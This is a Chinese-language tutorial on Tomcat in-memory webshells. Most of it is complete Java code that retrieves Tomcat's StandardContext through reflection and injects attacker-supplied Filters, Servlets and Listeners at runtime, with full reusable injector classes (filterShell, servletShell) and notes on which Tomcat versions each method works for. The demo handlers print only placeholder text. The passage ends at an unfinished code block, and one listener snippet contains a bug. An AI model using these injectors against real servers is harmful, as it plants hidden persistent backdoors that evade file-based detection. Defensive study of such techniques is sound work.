# Tomcat内存马  

## 内存马流程

1. 获取Context对象
    >Tomcat: StandardContext对象  
    >Weblogic: ServletContext对象  
    >SpringMVC: WebApplicationContext对象  
    >SpringBoot: WebApplicationContext对象
2. 创建创建servlet、filter或controller等恶意对象
3. 使用各类context对象的各种方法，向中间件或框架动态添加servlet、filter或controller等恶意对象，完成内存马的注入

## Tomcat获取StandardContext方法  

### 通过request对象获取

>适用范围:Tomcat全版本

1. tomcat6.0

    ```java
    java.lang.reflect.Field requestFacadeField = request.getClass().getDeclaredField("request");
    requestFacadeField.setAccessible(true);
    Object requestFacade = requestFacadeField.get(request);
    java.lang.reflect.Field contextField = requestFacade.getClass().getDeclaredField("context");
    contextField.setAccessible(true);
     org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) contextField.get(requestFacade);
    ```

2. tomcat7.0-last

    ```java
    //获取ServletContext对象
    javax.servlet.ServletContext servletContext = request.getServletContext();
    //获取ServletContext对象的context字段
    java.lang.reflect.Field appcationContextField = servletContext.getClass().getDeclaredField("context");
    appcationContextField.setAccessible(true);
    //获取ApplicationContext对象
    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) appcationContextField.get(servletContext);
    //获取ApplicationContext对象的context字段
    java.lang.reflect.Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    //获取StandardContext对象
    org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) standardContextField.get(applicationContext);
    ```

### 通过ContextClassLoader对象获取

Tomcat处理请求的线程中，存在ContextLoader对象，这个对象中保存了StandardContext对象  
>适用范围:Tomcat8-last

```java
public class GetByContextClassLoader {

    private org.apache.catalina.core.StandardContext standardContext;

    public GetByContextClassLoader(){
        setStandardContext();
    }

    private void setStandardContext(){
        Object obj = Thread.currentThread().getContextClassLoader();
        if(obj != null) {
            try {
                org.apache.catalina.loader.WebappClassLoader webappClassLoader = (org.apache.catalina.loader.WebappClassLoader) obj;
                java.lang.reflect.Method getResources = webappClassLoader.getClass().getDeclaredMethod("getResources");
                Object webResourceRoot = getResources.invoke(webappClassLoader);
                try {
                    java.lang.reflect.Field webResourceRootField = webResourceRoot.getClass().getDeclaredField("context");
                    webResourceRootField.setAccessible(true);
                    this.standardContext = (org.apache.catalina.core.StandardContext) webResourceRootField.get(webResourceRoot);
                } catch (Exception e) {
                    this.standardContext = null;
                }
            } catch (Exception e) {
                try {
                    java.lang.reflect.Field webappClassLoaderBaseField = obj.getClass().getSuperclass().getDeclaredField("resources");
                    webappClassLoaderBaseField.setAccessible(true);
                    org.apache.catalina.WebResourceRoot webResourceRoot = (org.apache.catalina.WebResourceRoot) webappClassLoaderBaseField.get(obj);
                    this.standardContext = (org.apache.catalina.core.StandardContext) webResourceRoot.getContext();
                } catch (Exception e1) {
                    this.standardContext = null;
                }
            }
        }
    }

    public org.apache.catalina.core.StandardContext getStandardContext() {
        return this.standardContext;
    }

}
```

### 通过MBean获取

​Tomcat使用JMX MBean来实现自身的性能管理，因此可以通过jmxMBeanServer对象，在其field中一步一步找到StandardContext对象。
>适用范围:Tomcat6.0-9.0版本(6.0.10-9.0.96)  
>**Tomcat10以后要求JDK9以上的版本，而Java9引入的模块系统导致一些内部api默认情况下不对外部模块(未命名模块)开放，并且不能通过反射获取其他模块的非public属性**

```java
public class GetByMBean {
    private org.apache.catalina.core.StandardContext standardContext;

    public GetByMBean() {
        setStandardContext();
    }

    private void setStandardContext() {
        //获取JmxMBeanServer对象
        com.sun.jmx.mbeanserver.JmxMBeanServer jmxMBeanServer = (com.sun.jmx.mbeanserver.JmxMBeanServer) org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
        // 获取MBeanServer对象
        javax.management.MBeanServer mbsInterceptor = getMbsInterceptor(jmxMBeanServer);
        // 获取Repository对象
        com.sun.jmx.mbeanserver.Repository repository = getRepository(mbsInterceptor);
        // 获取domainTb
        java.util.HashMap<String, java.util.Map<String, com.sun.jmx.mbeanserver.NamedObject>> domainTb = getDomainTb(repository);
        //获取Catalina的注册类表
        java.util.Map<String, com.sun.jmx.mbeanserver.NamedObject> catalina = domainTb.get("Catalina");
        //遍历注册类获取StandardContext对象
        for (com.sun.jmx.mbeanserver.NamedObject namedObject : catalina.values()) {
            this.standardContext = getStandardContext(namedObject);
            if (this.standardContext != null) {
                return;
            }
        }
    }

    public org.apache.catalina.core.StandardContext getStandardContext(){
        return this.standardContext;
    }

    private javax.management.MBeanServer getMbsInterceptor(com.sun.jmx.mbeanserver.JmxMBeanServer jmxMBeanServer) {
        if (jmxMBeanServer != null) {
            try {
                java.lang.reflect.Field field = jmxMBeanServer.getClass().getDeclaredField("mbsInterceptor");
                field.setAccessible(true);
                return (javax.management.MBeanServer) field.get(jmxMBeanServer);
            }catch (Exception e) {
                return null;
            }
        }
        return null;
    }

    private com.sun.jmx.mbeanserver.Repository getRepository(javax.management.MBeanServer mbsInterceptor){
        if (mbsInterceptor != null) {
            try {
                java.lang.reflect.Field field = mbsInterceptor.getClass().getDeclaredField("repository");
                field.setAccessible(true);
                return (com.sun.jmx.mbeanserver.Repository) field.get(mbsInterceptor);
            }catch (Exception e) {
                return null;
            }
        }
        return null;

    }
    private java.util.HashMap<String, java.util.Map<String,com.sun.jmx.mbeanserver.NamedObject>> getDomainTb(com.sun.jmx.mbeanserver.Repository repository) {
        if (repository != null) {
            try {
                java.lang.reflect.Field field = repository.getClass().getDeclaredField("domainTb");
                field.setAccessible(true);
                return  (java.util.HashMap<String,java.util.Map<String,com.sun.jmx.mbeanserver.NamedObject>>) field.get(repository);
            }catch (Exception e) {
                return null;
            }
        }
        return null;

    }

    private org.apache.catalina.core.StandardContext getStandardContext(com.sun.jmx.mbeanserver.NamedObject namedObject) {
        if (namedObject != null) {
            try {
                java.lang.reflect.Field field = namedObject.getClass().getDeclaredField("object");
                field.setAccessible(true);
                Object object = field.get(namedObject);
                try {
                    field = object.getClass().getDeclaredField("resource");
                }
                catch(Exception e){
                    field = object.getClass().getSuperclass().getDeclaredField("resource");
                }
                field.setAccessible(true);
                Object resource = field.get(object);
                java.lang.reflect.Method method = resource.getClass().getMethod("getContainer");
                return (org.apache.catalina.core.StandardContext) method.invoke(resource);
            }catch(Exception e){
                return null;
            }
        }
        return null;
    }
}
```

### 通过ThreadGroup获取

在Tomcat的线程数组中，有些线程中存储着StandardContext对象，可以通过特点线程获取StandardContext对象。  
>适用范围:Tomcat全版本(6.0.0-last)

```java
public class GetByThreadGroup {
    private String uri;
    private java.util.HashSet<String> serverName;
    private org.apache.catalina.core.StandardContext standardContext;

   public GetByThreadGroup() {
       setStandardContext();
    }

   public org.apache.catalina.core.StandardContext getStandardContext() {
       return this.standardContext;
   }

   private void setStandardContext() {
       Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
       java.util.ArrayList processors = getProcessors(threads);
       if (processors != null) {
           setUri(processors);
           setServerName(processors);
           this.standardContext = getStandardContextByAcceptor(threads);
           if (this.standardContext == null) {
               this.standardContext = getStandardContextByStandardEngine(threads);
           }
       }
       else {
           this.standardContext = null;
       }
   }

    private Object getField(Object object, String fieldName) {
        java.lang.reflect.Field field;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    private java.util.ArrayList getProcessors(Thread[] threads) {
        if (threads == null) {
            return null;
        }
        for (Thread thread : threads) {
            if (thread != null && !thread.getName().contains("exec")) {
                Object target = getField(thread, "target");
                if (target instanceof Runnable) {
                    Object object;
                    try {
                        object = getField(getField(getField(target, "this$0"), "handler"), "global");
                    } catch (Exception e) {
                        continue;
                    }
                    if (object != null) {
                        java.util.ArrayList processors = (java.util.ArrayList) getField(object, "processors");
                        if (processors != null) {
                            return processors;
                        }
                    }
                }
            }
        }
        return null;
    }


    private void setUri(java.util.ArrayList processors) {
        if (processors == null) {
            this.uri = null;
            return;
        }
        for (Object next : processors) {
            Object req = getField(next, "req");
            if (req != null) {
                Object serverPort = getField(req, "serverPort");
                if (serverPort != null) {
                    if (!serverPort.equals(-1)) {
                        org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "decodedUriMB");
                        if (uriMB != null) {
                            this.uri = (String) getField(uriMB, "strValue");
                            if (this.uri == null) {
                                this.uri = uriMB.toString() == null ? uriMB.getString() : uriMB.toString();
                            }
                            return;
                        }
                    }
                }
            }
        }
    }

    private void setServerName(java.util.ArrayList processors) {
        if (processors == null) {
            this.serverName = null;
            return;
        }
        for (Object next : processors) {
            Object req = getField(next, "req");
            Object serverPort = getField(req, "serverPort");
            // 不是对应的请求时，serverPort = -1
            if (serverPort.equals(-1)) {
                continue;
            }
            org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "serverNameMB");
            if (serverNameMB != null) {
                String name = (String) getField(serverNameMB, "strValue");
                this.serverName = new java.util.HashSet<String>();
                this.serverName.add("127.0.0.1");
                this.serverName.add("localhost");
                if (name != null) {
                    this.serverName.add(name);
                }
            }
            if (this.serverName.size() == 2) {
                String nameMB = serverNameMB.toString() == null ? serverNameMB.getString() : serverNameMB.toString();
                this.serverName.add(nameMB);
            }
        }
    }

    /*
        适用范围:Tomcat全版本
    */
    public org.apache.catalina.core.StandardContext getStandardContextByAcceptor(Thread[] threads) {
        if (threads == null) {
            return null;
        }
        for (Thread thread : threads) {
            if (thread != null && thread.getName().contains("http") && thread.getName().contains("Acceptor")) {
                Object target = getField(thread, "target");
                if (target != null) {
                    Object jioEndPoint = getField(target, "this$0") == null ? getField(target, "endpoint") : getField(target, "this$0");
                    if (jioEndPoint != null) {
                        Object protocol = getField(getField(jioEndPoint, "handler"), "proto") == null ? getField(getField(jioEndPoint, "handler"), "protocol") : getField(getField(jioEndPoint, "handler"), "proto");
                        if (protocol != null) {
                            Object service = getField(getField(getField(protocol, "adapter"), "connector"), "service");
                            if (service != null) {
                                Object engine = getField(service, "container") == null ? getField(service, "engine") : getField(service, "container");
                                if (engine != null) {
                                    java.util.HashMap children = (java.util.HashMap) getField(engine, "children");
                                    if (children != null) {
                                        for (String serverName : this.serverName) {
                                            org.apache.catalina.core.StandardHost standardHost = (org.apache.catalina.core.StandardHost) children.get(serverName);
                                            if (standardHost == null) {
                                                continue;
                                            }
                                            children = (java.util.HashMap) getField(standardHost, "children");
                                            if (children != null) {
                                                for (Object o : children.keySet()) {
                                                    String contextKey = (String) o;
                                                    if (!(this.uri.startsWith(contextKey))) {
                                                        continue;
                                                    }
                                                    return (org.apache.catalina.core.StandardContext) children.get(contextKey);
                                                }
                                            }
                                        }
                                    }
                                }
                            }

                        }
                    }
                }

            }
        }
        return null;
    }

    /*
        适用范围:Tomcat6.0-8.5(6.0.0-8.5.100)
    */
    public org.apache.catalina.core.StandardContext getStandardContextByStandardEngine(Thread[] threads) {
        if (threads == null) {
            return null;
        }
        for (Thread thread : threads) {
            if (thread != null && thread.getName().contains("StandardEngine")) {
                Object target = getField(thread, "target");
                if (target != null) {
                    java.util.HashMap children = (java.util.HashMap) getField(getField(target, "this$0"), "children");
                    if (children != null) {
                        for (String serverName : this.serverName) {
                            org.apache.catalina.core.StandardHost standardHost = (org.apache.catalina.core.StandardHost) children.get(serverName);
                            if (standardHost == null) {
                                continue;
                            }
                            children = (java.util.HashMap) getField(standardHost, "children");
                            if (children != null) {
                                for (Object o : children.keySet()) {
                                    String contextKey = (String) o;
                                    if (!(this.uri.startsWith(contextKey))) {
                                        continue;
                                    }
                                    return (org.apache.catalina.core.StandardContext) children.get(contextKey);
                                }
                            }
                        }
                    }
                }
            }

        }
        return null;
    }
}
```

## 获取request对象方法

### 通过JSP获取

JSP中内置request对象，可直接使用。
>适用范围:Tomcat全版本，前提是允许解析JSP(org.apache.jasper.servlet.JspServlet)

### 通过ThreadLocal获取request

在一个静态常量值为true时，org.apache.catalina.core.ApplicationFilterChain的lastServicedRequest和lastServicedResponse会将request对象和response对象存储进ThreadLocal对象中，通过反射修改该值再获取即可。  
>适用范围:Tomcat6.0-9.0(6.0.9-9.0.96)  
>**Tomcat10以后将静态常量值改成ApplicationFilterChain的对象字段，不再是静态字段**  
>**只能在所有的Filter之后获取，所以对shiro反序列这种Filter层的漏洞无用**

```java
public class GetByThreadLocal {

    private org.apache.catalina.core.StandardContext standardContext;
    private javax.servlet.ServletContext servletContext;

    public GetByThreadLocal() {
        setStandardContext();
    }

    private void setStandardContext() {
        try {
            modifyFields();
            //获取request对象，需要在第一次请求之后才能生效
            javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) getThreadLocal("lastServicedRequest").get();
            //获取response对象
            javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) getThreadLocal("lastServicedResponse").get();
            if (request != null && response != null) {
                try {
                    java.lang.reflect.Field requestFacadeField = request.getClass().getDeclaredField("request");
                    requestFacadeField.setAccessible(true);
                    Object requestObj = requestFacadeField.get(request);
                    java.lang.reflect.Field contextField = requestObj.getClass().getDeclaredField("context");
                    contextField.setAccessible(true);
                    this.standardContext = (org.apache.catalina.core.StandardContext) contextField.get(requestObj);
                } catch (Exception e) {
                    try {
                        java.lang.reflect.Method getServletContext = request.getClass().getMethod("getServletContext");
                        this.servletContext = (javax.servlet.ServletContext) getServletContext.invoke(request);
                        java.lang.reflect.Field appcationContextField = this.servletContext.getClass().getDeclaredField("context");
                        appcationContextField.setAccessible(true);
                        org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) appcationContextField.get(servletContext);
                        java.lang.reflect.Field standardContextField = applicationContext.getClass().getDeclaredField("context");
                        standardContextField.setAccessible(true);
                        this.standardContext = (org.apache.catalina.core.StandardContext) standardContextField.get(applicationContext);
                    } catch (Exception e1) {
                        this.standardContext = null;
                    }
                }
            } else {
                this.standardContext = null;
            }
        } catch (Exception e) {
            throw new RuntimeException();
        }
    }


    public org.apache.catalina.core.StandardContext getStandardContext() {
        return this.standardContext;
    }

    private void modifyFields() {
        java.lang.reflect.Field field;
        try {
            field = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
        } catch (Exception e) {
            try {
                field = Class.forName("org.apache.catalina.Globals").getDeclaredField("STRICT_SERVLET_COMPLIANCE");
            } catch (Exception e1) {
                field = null;
            }
        }
        if (removeFinal(field)) {
            field.setAccessible(true);
            try {
                if (!field.getBoolean(null)) {
                    field.setBoolean(null, true);
                }
            }catch (Exception e) {
            }
        }
    }


    private ThreadLocal getThreadLocal(String name){
        java.lang.reflect.Field field;
        try {
            field = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField(name);
        }
        catch (Exception e){
            return null;
        }
        if(removeFinal(field)){
            try {
                field.setAccessible(true);
                if (field.get(null) == null) {
                    field.set(null, new ThreadLocal());
                }
                return (ThreadLocal) field.get(null);
            }catch (Exception e){
                return null;
            }

        }
        return null;
    }

    private boolean removeFinal(java.lang.reflect.Field field) {
        if (field == null) {
            return false;
        }
        try {
            //获取字段修饰符
            java.lang.reflect.Field modifiersField = field.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            //去除final修饰符
            modifiersField.setInt(field, field.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}
```

## Filter型内存马

### 相关概念

1. FilterConfig  
FilterConfig是一个接口，用于存储与特定Filter相关的上下文信息。每个Filter在其生命周期内都有一个对应的 FilterConfig实例。
2. StandardContext.filterConfigs  
StandardContext.filterConfigs是一个HashMap<String,ApplicationFilterConfig>对象，用于存储与当前web应用上下文相关的所有FilterConfig实例。  
每当在web应用中定义一个新的Filter时，StandardContext.filterConfigs中就会增加一个新的键值对。
![image](https://github.com/user-attachments/assets/a07a76d3-a9e2-4faa-ae0e-b34bb9d6b4a7)
3. FilterDef  
FilterDef类用于存储与特定Filter相关的具体信息，作用和web.xml中的\<filter>一致。  
Tomcat会根据FilterDef创建Filter实例，并为每个实例生成一个FilterConfig，FilterConfig包含了从FilterDef中获取的初始化参数和上下文信息。  
FilterDef中有3个必需信息：
    >FilterName：Filter的名称，对应web.xml文件中的Filter-name标签。  
    >FilterClass：Filter的实现类的全限定名，对应web.xml文件中的Filter-class标签。  
    >Filter：实际的Filter对象实例，Tomcat在请求处理时调用它的方法。  
4. StandardContext.filterDefs  
StandardContext.filterDefs是一个HashMap<String,FilterDef>对象,用于存储与当前web应用上下文相关的所有FilterDef实例。
![image-1](https://github.com/user-attachments/assets/2ea5560a-06ed-48de-bb94-097c850861db)
5. FilterMap
FilterMap类用于管理和配置Filter，主要作用是定义Filter与其所应用的URL模式之间的映射关系，作用和web.xml中的\<filter-mapping>标签一致。  
FilterMap中有3个必需信息：
    >URLPattern：Filter应用的URL路径，对应web.xml文件中的url-pattern标签。  
    >FilterName：与Filter相关联的名称，对应web.xml文件中的Filter-name。  
    >DispatcherTypes：Filter应用的调度类型，一般为DispatcherType.REQUEST.name()，表示Filter在处理 HTTP请求时被调用。  
6. StandardContext.filterMaps  
StandardContext.filterMaps以array的形式存放各个filter的路径映射信息。  
7. ApplicationFilterConfig  
ApplicationFilterConfig类是FilterConfig接口的实现类。  
通过filterConfigs的put方法放入Filter的名称与ApplicationFilterConfig，从而实现Filter的注册。

### 注入Filter型内存马步骤

1. 获取StandardContext对象  
2. 创建Filter

    ```java
    public class DemoFilter implements Filter {
        
        public void init(FilterConfig filterConfig) {
        }

        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            /*
            获取回显的两种方式:response.getWriter()和response.getOutputStream()
            */
            //1.当filter没有service处理时，使用response.getWriter()回显，不能再添加chain.doFilter()传递请求，需要在当前filter结束请求，不然Tomcat会返回404错误，回显的数据也将会被丢弃。
            response.getWriter().println("Hello World");

            //2.使用response.getOutputStream()可以手动完成响应的发送，即使filter没有service处理，也会返回200并发送数据。
            response.getOutputStream().write("Hello World".getBytes());
            response.getOutputStream().flush();
            response.getOutputStream().close();
            chain.doFilter(request, response);
        }

        public void destroy() {}

    }
    ```  

3. 使用FilterDef对Filter进行封装，添加必要的属性，并添加到StandardContext.filterDefs中。  

    ```java
    //创建Filter对象
    DemoFilter demoFilter = new DemoFilter();
    //创建FilterDef对象
    org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
    //设置filter名称
    filterDef.setFilterName("Demo");
    //绑定Filter的实现类
    filterDef.setFilterClass(demoFilter.getClass().getName());
    //绑定filter,tomcat6无需此操作，会自动实例化对象。
    filterDef.setFilter(demoFilter);
    //把FilterDef对象添加进StandardContext的filterDefs中
    standardContext.addFilterDef(filterDef);
    ```

4. 创建filterMap类，并将路径和Filtername绑定，然后将其添加到StandardContext.filterMaps中  

    ```java
    //创建FilterMap对象
    org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
    //设置对应的filter名称
    filterMap.setFilterName("Demo");
    //添加该filter的路由映射关系
    filterMap.addURLPattern("/test");
    //设置该filter的调度类型
    filterMap.setDispatcher(javax.servlet.DispatcherType.REQUEST.name());
    //将filterMap对象添加进StandardContext.filterMaps的首位
    standardContext.addFilterMapBefore(filterMap);
    ```

5. 使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中  

    ```java
    //获取StandardContext的filterConfigs对象
    java.lang.reflect.Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    java.util.Map filterConfigs = (java.util.Map) Configs.get(standardContext);
    //封装StandardContext和FilterDef对象，实例化出一个ApplicationFilterConfig对象
    java.lang.reflect.Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class,org.apache.tomcat.util.descriptor.web.FilterDef.class);
    constructor.setAccessible(true);
    org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
    //将filter名称和ApplicationFilterConfig对象放入FilterConfigs对象中
    filterConfigs.put("Demo",filterConfig);
    ```

6. 完整代码

    ```java
    public class filterShell {

        private final String tomcat6 = "org.apache.catalina.deploy.";
        private final String tomcat8 = "org.apache.tomcat.util.descriptor.web.";
        private Class<?> filterDefClazz;
        private Class<?> filterMapClazz;
        private final String filterName;
        private final String URLPattern;

        public filterShell(String filterName, String URLPattern) {
            this.filterName = filterName;
            this.URLPattern = URLPattern;
            try {
                this.filterDefClazz = Class.forName(tomcat6 + "FilterDef");
            } catch (Exception e) {
                try {
                    this.filterDefClazz = Class.forName(tomcat8 + "FilterDef");
                } catch (Exception e1) {
                    this.filterDefClazz = null;
                }
            }
            try {
                this.filterMapClazz = Class.forName(tomcat6 + "FilterMap");
            } catch (Exception e) {
                try {
                    this.filterMapClazz = Class.forName(tomcat8 + "FilterMap");
                } catch (Exception e1) {
                    this.filterMapClazz = null;
                }
            }
        }

        public void injection(org.apache.catalina.core.StandardContext standardContext, javax.servlet.Filter filter) {
            if (standardContext != null && filter != null) {
                Object filterDef = creatFilterDefs(standardContext, filter);
                Object filterMap = createFilterMap(standardContext);
                if (moveFilterMapFirst(standardContext)) {
                    if (filterDef != null && filterMap != null) {
                        updateFilterConfigs(standardContext, filterDef);
                    }
                }
            }
        }

        private Object creatFilterDefs(org.apache.catalina.core.StandardContext standardContext, javax.servlet.Filter filter) {
            if (this.filterDefClazz != null && standardContext != null && filter != null) {
                try {
                    Object filterDef = this.filterDefClazz.newInstance();
                    String className = this.filterDefClazz.getName();
                    java.lang.reflect.Method setFilterName = this.filterDefClazz.getMethod("setFilterName", String.class);
                    setFilterName.invoke(filterDef, this.filterName);
                    java.lang.reflect.Method setFilterClass = this.filterDefClazz.getMethod("setFilterClass", String.class);
                    setFilterClass.invoke(filterDef, filter.getClass().getName());
                    if (className.contains(this.tomcat8)) {
                        java.lang.reflect.Method setFilter = this.filterDefClazz.getMethod("setFilter", javax.servlet.Filter.class);
                        setFilter.invoke(filterDef, filter);
                    }
                    java.lang.reflect.Method addFilterDef = standardContext.getClass().getMethod("addFilterDef", this.filterDefClazz);
                    addFilterDef.invoke(standardContext, filterDef);
                    return filterDef;
                } catch (Exception e) {
                    return null;
                }
            }
            return null;
        }

        private Object createFilterMap(org.apache.catalina.core.StandardContext standardContext) {
            if (this.filterMapClazz != null && standardContext != null) {
                try {
                    Object filterMap = this.filterMapClazz.newInstance();
                    String className = this.filterMapClazz.getName();
                    java.lang.reflect.Method addURLPattern = this.filterMapClazz.getMethod("addURLPattern", String.class);
                    addURLPattern.invoke(filterMap, this.URLPattern);
                    java.lang.reflect.Method setFilterName = this.filterMapClazz.getMethod("setFilterName", String.class);
                    setFilterName.invoke(filterMap, this.filterName);
                    java.lang.reflect.Method setDispatcher = this.filterMapClazz.getMethod("setDispatcher", String.class);
                    setDispatcher.invoke(filterMap, "REQUEST");
                    if (className.contains(this.tomcat6)) {
                        java.lang.reflect.Method addFilterMap = standardContext.getClass().getMethod("addFilterMap", this.filterMapClazz);
                        addFilterMap.invoke(standardContext, filterMap);
                    } else {
                        java.lang.reflect.Method addFilterMapBefore = standardContext.getClass().getMethod("addFilterMapBefore", this.filterMapClazz);
                        addFilterMapBefore.invoke(standardContext, filterMap);
                    }

                    return filterMap;
                } catch (Exception e) {
                    return null;
                }
            }
            return null;
        }

        private void updateFilterConfigs(org.apache.catalina.core.StandardContext standardContext, Object filterDef) {
            if (standardContext != null) {
                try {
                    java.lang.reflect.Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
                    Configs.setAccessible(true);
                    java.util.Map filterConfigs = (java.util.Map) Configs.get(standardContext);
                    java.lang.reflect.Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(org.apache.catalina.Context.class, this.filterDefClazz);
                    constructor.setAccessible(true);
                    Object filterConfig = constructor.newInstance(standardContext, filterDef);
                    filterConfigs.put(this.filterName, filterConfig);
                } catch (Exception e) {
                }
            }
        }

        private boolean moveFilterMapFirst(org.apache.catalina.core.StandardContext standardContext) {
            if (standardContext != null && this.filterMapClazz.getName().contains(this.tomcat6)) {
                try {
                    java.lang.reflect.Field filterMaps = standardContext.getClass().getDeclaredField("filterMaps");
                    filterMaps.setAccessible(true);
                    Object[] objects;
                    try {
                        objects = (Object[]) filterMaps.get(standardContext); //tomcat6
                    }catch (Exception e) {
                            return true; //tomcat7也会走到这，直接返回true
                        }
                    if(objects != null && objects.length > 1){
                        Object lastElement = objects[objects.length - 1];
                        for (int i = objects.length - 1; i > 0; i--) {
                            objects[i] = objects[i - 1];
                        }
                        objects[0] = lastElement;
                        return true;
                    }
                    else {
                        return false;
                    }
                } catch (Exception e) {
                    return false;
                }
            }
            return true;
        }
    }
    ```

## Servlet型内存马

### 基础概念

1. Container接口  
Container是Tomcat中容器的接口,Container一共有4个子接口:Engine(引擎),Host(主机),Context(上下文)和Wrapper(包装器)和一个默认实现类ContainerBase。  
每个子接口都是一个容器,这4个子容器都有一个对应的StandardXXX实现类,并且这些实现类都继承ContainerBase类。
Container的子容器EngineHostContextWrapper是逐层包含的关系，其中Engine是最顶层，最多只能有一个Engine，Engine里面可以有多个Host，每个Host下可以有多个Context，每个Context下可以有多个Wrapper。
2. Wrapper接口  
每一个Wrapper封装了一个servlet,用于加载对应的servlet来处理请求。
3. StandardWrapper类  
StandardWrapper类是Wrapper接口的标准实现,封装了对应的servlet的具体信息。  
一个StandardWrapper对象中包含三个必须字段:
    >ServletClass: servlet实现类的全限定名,对应web.xml中的\<servlet-class>  
    >Name: servlet的名称,对应web.xml中的\<servlet-name>  
    >Servlet: 具体的servlet实例。
4. StandardContext.addChild()  
StandardContext.addChild()方法用于将StandardWrapper对象添加到StandardContext中，将特定的servlet与上下文关联起来，从而使得该servlet能够在该上下文中被调用和管理。
5. StandardContext.servletMappings  
StandardContext.servletMappings属性是一个HashMap，用于存储servlet的URL映射信息。  
StandardContext.servletMappings的键是service的路由，对应web.xml中的\<url-pattern>  
StandardContext.servletMappings的值是service的名称，对应web.xml中的\<servlet-name>  
可以通过StandardContext.addServletMappingDecoded()来向StandardContext.servletMappings新增servlet。

### 注入Servlet型内存马步骤

1. 获取StandardContext对象  
2. 编写恶意servlet

    ```java
    import javax.servlet.ServletConfig;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;

    public class TestServlet extends HttpServlet {
        protected void doGet(HttpServletRequest request, HttpServletResponse resp) throws IOException {
            resp.getWriter().println("test");
        }
    }
    ```

3. 获取一个StandardWrapper实例并封装对应的servlet信息。  

    ```java
    TestServlet testServlet = new TestServlet();
    String name = testServlet.getClass().getSimpleName();
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(testServlet);
    wrapper.setServletClass(testServlet.getClass().getName());
    ```

4. 将StandardWrapper对象绑定StandardContext对象并向StandardContext.servletMappings添加相应的键值对。

    ```java
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/shell",name);
    ```

5. 完整代码

    ```java
    public class servletShell {
        private final String URLPattern;
        private final String servletName;

        public servletShell(String pattern, String name){
            this.URLPattern = pattern;
            this.servletName = name;
        }

        public void injection(org.apache.catalina.core.StandardContext standardContext, javax.servlet.http.HttpServlet servlet) {
            String servletName = servlet.getClass().getName();
            org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
            wrapper.setServletClass(servletName);
            wrapper.setName(this.servletName);
            wrapper.setServlet(servlet);
            wrapper.setLoadOnStartup(1); //设置立即加载到内存中
            standardContext.addChild(wrapper);
            try {
                java.lang.reflect.Method addServletMappingDecoded = standardContext.getClass().getMethod("addServletMappingDecoded", String.class,String.class);
                addServletMappingDecoded.invoke(standardContext, this.URLPattern, this.servletName);
            }catch (Exception e){
                try {
                    java.lang.reflect.Method addServletMapping = standardContext.getClass().getMethod("addServletMapping", String.class,String.class); //tomcat9以下
                    addServletMapping.invoke(standardContext, this.URLPattern, this.servletName);
                }catch (Exception e1){
                }
            }
        }
    }
    ```

>**tomcat6打不了servlet内存马，servlet能注册但是访问无法触发，原因未知。**

## Listener型内存马

Listener型内存马比较简单，创建一个Listener(一般是ServletRequestListener)并将其添加进StandardContext对象中的applicationEventListenersList数组中即可。

1. 获取StandardContext对象
2. 编写恶意Listener类

    ```java
    import javax.servlet.ServletRequestListener;
    import javax.servlet.ServletRequestEvent;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.lang.reflect.Field;

    public class DemoListener implements ServletRequestListener {

        public void requestInitialized(ServletRequestEvent sre) {
            try {
                HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
                org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) request();
                Field requestField = requestFacade.getClass().getDeclaredField("request");
                requestField.setAccessible(true);
                org.apache.catalina.connector.Request Request = (org.apache.catalina.connector.Request)requestField.get(requestFacade);
                HttpServletResponse response = Request.getResponse();
                response.getOutputStream().write("test".getBytes());
                response.getOutputStream().flush();
                response.getOutputStream().close();
            }catch (Exception e){
            }
        }

        public void requestDestroyed(ServletRequestEvent sre) {
        }

    }
    ```

3. 将Listener类对象添加进StandardContext对象中的applicationEventListenersList数组中。

    ```java
    standardContext.addApplicationEventListener(new DemoListener())
    ```

4. 完整代码

    ```java
